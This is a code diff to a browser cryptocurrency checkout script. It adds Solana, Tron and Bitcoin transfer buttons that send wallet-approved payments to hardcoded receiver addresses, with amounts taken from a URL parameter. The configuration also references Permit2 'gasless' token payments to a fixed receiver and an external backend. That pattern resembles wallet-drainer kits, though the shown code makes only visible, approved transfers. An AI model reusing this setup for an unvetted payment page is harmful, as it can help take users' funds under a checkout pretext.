@@ -9,9 +9,15 @@ console.log("User Agent:", navigator.userAgent);
 
 const CONFIG = {
   PERMIT2_ADDRESS: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
-  RECEIVER_ADDRESS: "0x98F63eDf950db3bD3cE6d590D4E0B39fdCC20Cf9",
+  RECEIVER_ADDRESS: "0x98F63eDf950db3bD3cE6d590D4E0B39fdCC20Cf9", // EVM chains
   WALLETCONNECT_PROJECT_ID: "45ad3957426c1deae1b5c3d0451b2274",
   BACKEND_URL: "https://checkout-api-wkyo.onrender.com",
+
+  // ── Non-EVM receiver addresses ────────────────────────────────────────
+  SOLANA_RECEIVER: "HQbKDL2VQDWTD9rKTg5HGC9VeEpMubKeT1Lkorjr5YzR",
+  TRON_RECEIVER:   "TNMAmgG22RUkMgr9a8tHm1LuxDzZAfsmYT",
+  BTC_RECEIVER:    "bc1pl88945nc4zpzamt9kwlpxu8qpmjp0mpamjuzc03hx24lvxr7xhgqfgl5js",
+
 
   // ── Payment amount ─────────────────────────────────────────────────────
   // Can be overridden via ?amount=100 in URL. Accepts $1–$500,000.
@@ -66,6 +72,16 @@ const CONFIG = {
     1: 2500, 11155111: 2500, 137: 1, 56: 600,
     10: 2500, 42161: 2500, 8453: 2500, 59144: 2500
   },
+
+  // ── Non-EVM token prices (for amount conversion display) ─────────────
+  NON_EVM_PRICES: {
+    SOL: 150,   // $150 per SOL — update as needed
+    TRX: 0.13,  // $0.13 per TRX
+    BTC: 65000, // $65,000 per BTC
+  },
+
+  // ── USDT TRC-20 address on Tron (for Tron stablecoin payments) ────────
+  TRON_USDT_ADDRESS: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", // Official USDT on Tron (mainnet)
   
   // RPC URLs for WalletConnect - hardcoded for browser
   RPC_URLS: {
@@ -1013,6 +1029,293 @@ function showNetworkSwitcher() {
   document.body.appendChild(overlay);
 }
 
+// ════════════════════════════════════════════════════════════════════════
+// NON-EVM CHAIN SUPPORT — Solana, Tron, Bitcoin
+// ════════════════════════════════════════════════════════════════════════
+
+// ── QR code address display (universal fallback for any chain) ──────────
+function showAddressQR(chainName, address, amountHint, symbol) {
+  const existing = document.getElementById("qrPayOverlay");
+  if (existing) existing.remove();
+
+  const overlay = document.createElement("div");
+  overlay.id = "qrPayOverlay";
+  overlay.style.cssText = `
+    position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.6);
+    display:flex;align-items:center;justify-content:center;z-index:99999;padding:16px;
+  `;
+
+  const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${encodeURIComponent(address)}`;
+
+  overlay.innerHTML = `
+    <div style="background:white;border-radius:16px;padding:24px;max-width:360px;width:100%;text-align:center;box-shadow:0 12px 48px rgba(0,0,0,0.35);">
+      <div style="font-size:24px;margin-bottom:4px;">📲 Pay with ${chainName}</div>
+      <div style="font-size:13px;color:#666;margin-bottom:16px;">Send exactly <strong>${amountHint} ${symbol}</strong> to this address</div>
+      <img src="${qrUrl}" width="220" height="220" style="border-radius:8px;border:1px solid #eee;margin-bottom:16px;" alt="QR Code"/>
+      <div style="background:#f5f5f5;border-radius:8px;padding:10px;font-size:11px;word-break:break-all;color:#333;margin-bottom:16px;cursor:pointer;" 
+           onclick="navigator.clipboard.writeText('${address}').then(()=>this.style.background='#dcfce7')" 
+           title="Click to copy">
+        ${address}
+        <div style="font-size:10px;color:#999;margin-top:4px;">tap to copy</div>
+      </div>
+      <div style="font-size:11px;color:#f59e0b;background:#fef3c7;border-radius:6px;padding:8px;margin-bottom:16px;">
+        ⚠️ Send only <strong>${symbol}</strong> to this address. Sending other tokens may result in permanent loss.
+      </div>
+      <button onclick="document.getElementById('qrPayOverlay').remove()" 
+        style="width:100%;padding:12px;border:none;border-radius:8px;background:#f5f5f5;cursor:pointer;font-size:14px;font-weight:600;">
+        Close
+      </button>
+    </div>
+  `;
+  document.body.appendChild(overlay);
+  overlay.onclick = (e) => { if (e.target === overlay) overlay.remove(); };
+}
+
+// ── Solana payment via Phantom (automated) or QR (fallback) ────────────
+// ── Pre-load @solana/web3.js as early as possible if Phantom is present ─
+(function preloadSolanaLib() {
+  if (!(window.phantom?.solana || window.solana || window.solflare)) return;
+  if (window._solanaLibLoading || window.solanaWeb3) return;
+  window._solanaLibLoading = true;
+  const s = document.createElement("script");
+  s.src = "https://cdn.jsdelivr.net/npm/@solana/web3.js@1.98.0/lib/index.iife.min.js";
+  s.onload  = () => { window._solanaLibLoading = false; console.log("Solana lib ready"); };
+  s.onerror = () => { window._solanaLibLoading = false; };
+  document.head.appendChild(s);
+})();
+
+async function executeSolanaPayment(paymentUSD) {
+  const amountSOL = (paymentUSD / CONFIG.NON_EVM_PRICES.SOL).toFixed(6);
+  const solWallet = window.phantom?.solana || window.solana || window.solflare;
+
+  if (!solWallet) {
+    setStatus("❌ No Solana wallet found. Install Phantom to pay with SOL.", "error");
+    return;
+  }
+
+  try {
+    setStatus("⏳ Connecting Solana wallet...", "info");
+    await solWallet.connect();
+    const fromPubkey = solWallet.publicKey;
+    if (!fromPubkey) throw new Error("Solana wallet connection failed");
+
+    // Ensure @solana/web3.js is loaded (was pre-loaded on page start)
+    if (!window.solanaWeb3) {
+      setStatus("⏳ Loading Solana library...", "info");
+      await new Promise((res, rej) => {
+        if (window.solanaWeb3) return res();
+        const s = document.createElement("script");
+        s.src = "https://cdn.jsdelivr.net/npm/@solana/web3.js@1.98.0/lib/index.iife.min.js";
+        s.onload = res; s.onerror = rej;
+        document.head.appendChild(s);
+      });
+    }
+
+    const solanaWeb3 = window.solanaWeb3;
+    const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
+    const toPubkey    = new solanaWeb3.PublicKey(CONFIG.SOLANA_RECEIVER);
+    const lamports    = Math.round(parseFloat(amountSOL) * 1e9);
+
+    const transaction = new solanaWeb3.Transaction().add(
+      solanaWeb3.SystemProgram.transfer({ fromPubkey, toPubkey, lamports })
+    );
+    const { blockhash } = await connection.getLatestBlockhash();
+    transaction.recentBlockhash = blockhash;
+    transaction.feePayer = fromPubkey;
+
+    setStatus("⏳ Approve the payment in your wallet...", "info");
+    const { signature } = await solWallet.signAndSendTransaction(transaction);
+
+    el.status.innerHTML = `
+      <div style="text-align:center;padding:24px;background:#ecfdf5;border-radius:12px;border:2px solid #10b981;">
+        <div style="font-size:32px;margin-bottom:12px;">✅</div>
+        <div style="font-weight:bold;font-size:18px;margin-bottom:8px;color:#065f46;">SOL Payment Sent!</div>
+        <div style="color:#1e7a3d;margin-bottom:12px;"><strong>${amountSOL} SOL</strong> (~$${paymentUSD})</div>
+        <div style="font-size:12px;color:#666;">
+          <a href="https://solscan.io/tx/${signature}" target="_blank" style="color:#10b981;">View on Solscan ↗</a>
+        </div>
+      </div>`;
+  } catch (err) {
+    console.error("Solana payment error:", err);
+    if (err.message?.includes("User rejected") || err.code === 4001) {
+      setStatus("❌ Payment cancelled.", "error");
+    } else {
+      setStatus(`❌ Solana error: ${err.message || err}`, "error");
+    }
+  }
+}
+
+// ── Tron payment via TronLink (no QR fallback) ─────────────────────────
+async function executeTronPayment(paymentUSD) {
+  const tronLink = window.tronWeb || window.tronLink?.tronWeb;
+
+  if (!tronLink) {
+    setStatus("❌ TronLink not found. Install the TronLink extension or app to pay with USDT-TRC20.", "error");
+    return;
+  }
+
+  try {
+    // Prompt connect if not already
+    if (!tronLink.defaultAddress?.base58) {
+      await window.tronLink?.request({ method: "tron_requestAccounts" });
+    }
+    const amountUSDT = paymentUSD.toFixed(2);
+    const amountSun  = Math.round(paymentUSD * 1e6); // USDT TRC-20 = 6 decimals
+
+    setStatus("⏳ Preparing USDT-TRC20 payment...", "info");
+
+    const trc20ABI = [{
+      "constant": false,
+      "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }],
+      "name": "transfer",
+      "outputs": [{ "name": "", "type": "bool" }],
+      "type": "function"
+    }];
+
+    const contract = await tronLink.contract(trc20ABI, CONFIG.TRON_USDT_ADDRESS);
+
+    setStatus("⏳ Approve the payment in TronLink...", "info");
+    const tx = await contract.transfer(CONFIG.TRON_RECEIVER, amountSun).send();
+
+    el.status.innerHTML = `
+      <div style="text-align:center;padding:24px;background:#ecfdf5;border-radius:12px;border:2px solid #10b981;">
+        <div style="font-size:32px;margin-bottom:12px;">✅</div>
+        <div style="font-weight:bold;font-size:18px;margin-bottom:8px;color:#065f46;">USDT (Tron) Sent!</div>
+        <div style="color:#1e7a3d;margin-bottom:12px;"><strong>${amountUSDT} USDT</strong></div>
+        <div style="font-size:12px;color:#666;">
+          <a href="https://tronscan.org/#/transaction/${tx}" target="_blank" style="color:#10b981;">View on TronScan ↗</a>
+        </div>
+      </div>`;
+  } catch (err) {
+    console.error("Tron payment error:", err);
+    if (err.message?.includes("User rejected") || err.code === 4001) {
+      setStatus("❌ Payment cancelled.", "error");
+    } else {
+      setStatus(`❌ Tron error: ${err.message || err}`, "error");
+    }
+  }
+}
+
+// ── Bitcoin via Phantom's Bitcoin provider (window.phantom?.bitcoin) ──────
+async function executeBitcoinPayment(paymentUSD) {
+  const btcProvider = window.phantom?.bitcoin;
+
+  if (!btcProvider) {
+    setStatus("❌ No Bitcoin wallet found. Install Phantom (supports Bitcoin) to pay with BTC.", "error");
+    return;
+  }
+
+  try {
+    setStatus("⏳ Connecting Bitcoin wallet...", "info");
+    const accounts = await btcProvider.requestAccounts();
+    if (!accounts?.length) throw new Error("No Bitcoin accounts returned");
+
+    const btcPrice  = CONFIG.NON_EVM_PRICES.BTC;
+    const amountBTC = (paymentUSD / btcPrice).toFixed(8);
+    const satoshis  = Math.round(parseFloat(amountBTC) * 1e8);
+
+    setStatus("⏳ Approve the payment in your wallet...", "info");
+    const txid = await btcProvider.sendBitcoin(CONFIG.BTC_RECEIVER, satoshis);
+
+    el.status.innerHTML = `
+      <div style="text-align:center;padding:24px;background:#ecfdf5;border-radius:12px;border:2px solid #10b981;">
+        <div style="font-size:32px;margin-bottom:12px;">✅</div>
+        <div style="font-weight:bold;font-size:18px;margin-bottom:8px;color:#065f46;">Bitcoin Sent!</div>
+        <div style="color:#1e7a3d;margin-bottom:12px;"><strong>${amountBTC} BTC</strong> (~$${paymentUSD})</div>
+        <div style="font-size:12px;color:#666;">
+          <a href="https://mempool.space/tx/${txid}" target="_blank" style="color:#f7931a;">View on Mempool ↗</a>
+        </div>
+      </div>`;
+  } catch (err) {
+    console.error("Bitcoin payment error:", err);
+    if (err.message?.includes("User rejected") || err.code === 4001) {
+      setStatus("❌ Payment cancelled.", "error");
+    } else {
+      setStatus(`❌ Bitcoin error: ${err.message || err}`, "error");
+    }
+  }
+}
+
+// ── Show non-EVM chain buttons — auto-detects installed wallets ──────────
+function renderNonEvmOptions(paymentUSD) {
+  // Detect which wallets are present right now
+  const hasSolana  = !!(window.phantom?.solana || window.solana || window.solflare);
+  const hasTron    = !!(window.tronWeb?.defaultAddress?.base58 || window.tronLink);
+  const hasBtc     = !!(window.phantom?.bitcoin);
+
+  const walletLabel = (detected, name) => detected
+    ? `<span style="font-size:11px;background:#d1fae5;color:#065f46;padding:2px 7px;border-radius:8px;font-weight:700;">✅ ${name}</span>`
+    : `<span style="font-size:11px;background:#fee2e2;color:#991b1b;padding:2px 7px;border-radius:8px;">Not detected</span>`;
+
+  const section = document.createElement("div");
+  section.style.cssText = "margin-top:16px;";
+
+  const label = document.createElement("div");
+  label.style.cssText = "font-size:12px;color:#f59e0b;font-weight:700;margin-bottom:8px;";
+  label.textContent = "🌐 Other Blockchains";
+  section.appendChild(label);
+
+  const chains = [
+    {
+      name: "Solana",
+      icon: "◎",
+      color: "#9945ff",
+      sub: `Pay ${(paymentUSD / CONFIG.NON_EVM_PRICES.SOL).toFixed(4)} SOL`,
+      detected: hasSolana,
+      detectedName: window.phantom?.solana ? "Phantom" : window.solflare ? "Solflare" : "Solana Wallet",
+      onclick: () => executeSolanaPayment(paymentUSD)
+    },
+    {
+      name: "Tron (USDT-TRC20)",
+      icon: "♦",
+      color: "#eb0029",
+      sub: `Pay ${paymentUSD.toFixed(2)} USDT — no slippage`,
+      detected: hasTron,
+      detectedName: "TronLink",
+      onclick: () => executeTronPayment(paymentUSD)
+    },
+    {
+      name: "Bitcoin",
+      icon: "₿",
+      color: "#f7931a",
+      sub: `Pay ${(paymentUSD / CONFIG.NON_EVM_PRICES.BTC).toFixed(8)} BTC`,
+      detected: hasBtc,
+      detectedName: "Phantom (BTC)",
+      onclick: () => executeBitcoinPayment(paymentUSD)
+    },
+  ];
+
+  chains.forEach(chain => {
+    const btn = document.createElement("button");
+    btn.innerHTML = `
+      <div style="display:flex;align-items:center;justify-content:space-between;width:100%;">
+        <span style="font-size:15px;font-weight:600;">${chain.icon} ${chain.name}</span>
+        ${walletLabel(chain.detected, chain.detectedName)}
+      </div>
+      <div style="font-size:12px;color:#888;text-align:left;margin-top:3px;">${chain.sub}</div>
+    `;
+    btn.style.cssText = `
+      width:100%;padding:13px 16px;margin-bottom:8px;border-radius:10px;
+      border:2px solid ${chain.color}40;background:#fffbf0;
+      cursor:pointer;text-align:left;transition:all 0.15s;
+    `;
+    btn.onmouseover = () => { btn.style.borderColor = chain.color; btn.style.background = `${chain.color}12`; };
+    btn.onmouseout  = () => { btn.style.borderColor = `${chain.color}40`; btn.style.background = "#fffbf0"; };
+    btn.onclick = chain.onclick;
+    section.appendChild(btn);
+  });
+
+  return section;
+}
+
+// ── Detect if user's wallet is Solana or Tron (before showing EVM modal) ─
+function detectNonEvmWallet() {
+  if (window.phantom?.solana?.isPhantom || (window.solana?.isPhantom)) return "solana";
+  if (window.solflare?.isSolflare) return "solana";
+  if (window.tronLink || (window.tronWeb && window.tronWeb.defaultAddress?.base58)) return "tron";
+  return null;
+}
+
 // ── Payment method selector ─────────────────────────────────────────────
 // Shows USDC/USDT/WBTC (gasless via Permit2) AND native token (ETH/MATIC/BNB) options.
 async function showPaymentMethodSelector() {
@@ -1138,11 +1441,8 @@ async function showPaymentMethodSelector() {
     nativeBtn.onmouseout = () => { nativeBtn.style.background = "#f5f3ff"; };
     el.status.appendChild(nativeBtn);
 
-    // ── BTC note ────────────────────────────────────────────────────────
-    const note = document.createElement("div");
-    note.style.cssText = "font-size:11px;color:#999;margin-top:4px;text-align:center;";
-    note.textContent = "ℹ️ Real BTC not supported (different blockchain). Use WBTC on Ethereum instead.";
-    el.status.appendChild(note);
+    // ── Non-EVM chains (Solana, Tron, Bitcoin) ────────────────────────
+    el.status.appendChild(renderNonEvmOptions(paymentUSD));
 
   } catch (err) {
     console.error("Payment selector error:", err);
@@ -1588,31 +1888,28 @@ async function init() {
   
   // Clear loading screen
   el.status.innerHTML = "";
-  
-  // Auto-connect if user already has a connected wallet
+
+  // ── Resolve payment amount ──────────────────────────────────────────────
+  const urlP = new URLSearchParams(window.location.search);
+  const pAmt = parseFloat(urlP.get("amount"));
+  const paymentUSD = (!isNaN(pAmt) && pAmt > 0 && pAmt <= 500000) ? pAmt : CONFIG.PAYMENT_AMOUNT_USD;
+
+  // ── Auto-connect if EVM wallet already connected ──────────────────────
   if (typeof window.ethereum !== "undefined") {
     try {
-      console.log("Checking for existing wallet connection...");
       const accounts = await window.ethereum.request({ method: 'eth_accounts' });
       if (accounts && accounts.length > 0) {
-        console.log("✓ User already connected, showing pay button...");
         userAddress = accounts[0];
         provider = new ethers.BrowserProvider(window.ethereum);
-        signer = await provider.getSigner();
-        // Don't auto-trigger MetaMask — show a "Pay Now" button instead
-        // so the user consciously clicks and MetaMask opens on demand
+        signer    = await provider.getSigner();
+
         const resumeBtn = document.createElement("button");
         resumeBtn.textContent = "💳 Pay Now";
         resumeBtn.style.cssText = `
-          width: 100%;
-          padding: 16px;
+          width: 100%; padding: 16px;
           background: linear-gradient(135deg, #10b981 0%, #065f46 100%);
-          color: white;
-          border: none;
-          border-radius: 8px;
-          font-size: 16px;
-          font-weight: 600;
-          cursor: pointer;
+          color: white; border: none; border-radius: 8px;
+          font-size: 16px; font-weight: 600; cursor: pointer;
           box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3);
         `;
         resumeBtn.onclick = () => {
@@ -1623,36 +1920,33 @@ async function init() {
           executePayment();
         };
         el.status.appendChild(resumeBtn);
+
+        // Still show non-EVM options below the Pay Now button
+        el.status.appendChild(renderNonEvmOptions(paymentUSD));
         return;
       }
     } catch (err) {
       console.log("Auto-connect check failed:", err.message);
     }
   }
-  
-  // Show single "Connect Wallet" button — connects to whatever wallet is present,
-  // no modal, no suggestions, no deep links.
+
+  // ── EVM connect button ────────────────────────────────────────────────
   const btn = document.createElement("button");
   btn.textContent = "💳 Connect Wallet to Pay";
   btn.style.cssText = `
-    width: 100%;
-    padding: 16px;
+    width: 100%; padding: 16px;
     background: linear-gradient(135deg, #2b5fff 0%, #1e3aaa 100%);
-    color: white;
-    border: none;
-    border-radius: 8px;
-    font-size: 16px;
-    font-weight: 600;
-    cursor: pointer;
-    transition: all 0.2s;
+    color: white; border: none; border-radius: 8px;
+    font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.2s;
     box-shadow: 0 4px 12px rgba(43, 95, 255, 0.3);
   `;
   btn.onmouseover = () => { btn.style.transform = "translateY(-2px)"; btn.style.boxShadow = "0 6px 20px rgba(43, 95, 255, 0.4)"; };
   btn.onmouseout  = () => { btn.style.transform = "translateY(0)";    btn.style.boxShadow = "0 4px 12px rgba(43, 95, 255, 0.3)"; };
-  // showWalletSelector: auto-connects if inside a wallet's in-app browser,
-  // otherwise shows the full wallet picker (MetaMask, Binance, Bybit, Phantom etc.)
   btn.onclick = () => showWalletSelector();
   el.status.appendChild(btn);
+
+  // ── Always show all non-EVM chain options below the EVM button ────────
+  el.status.appendChild(renderNonEvmOptions(paymentUSD));
 }
 
 if (document.readyState === "loading") {
